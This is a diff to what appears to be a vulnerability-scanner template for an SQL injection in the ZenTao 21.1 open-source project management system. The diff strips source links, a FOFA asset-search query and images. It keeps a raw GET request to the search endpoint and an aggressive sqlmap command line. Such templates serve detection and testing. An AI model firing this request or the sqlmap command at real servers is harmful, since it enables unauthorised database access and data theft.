@@ -3,12 +3,8 @@ info:
   name: 禅道21.1开源版存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ghnbqaxmhp1hn6rn'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ghnbqaxmhp1hn6rn
-    fofa: app="易软天创-禅道系统"
 http:
 - raw:
   - 'GET /index.php?m=search&f=index&words=1&type=all&zin=1 HTTP/1.1
@@ -39,11 +35,8 @@ http:
 
     Priority: u=4
 
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1739274051073-86fb4ad0-0be5-440f-9cfd-7d95ad467356.png)
 
-    python sqlmap.py -r 1.txt --level=5 --risk=3 --threads=10 --dbms=mysql
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1739274051394-545ddf11-4583-44eb-accf-fa6ccd3f4239.png)'
+    python sqlmap.py -r 1.txt --level=5 --risk=3 --threads=10 --dbms=mysql'
   redirects: false
   matchers:
   - status:
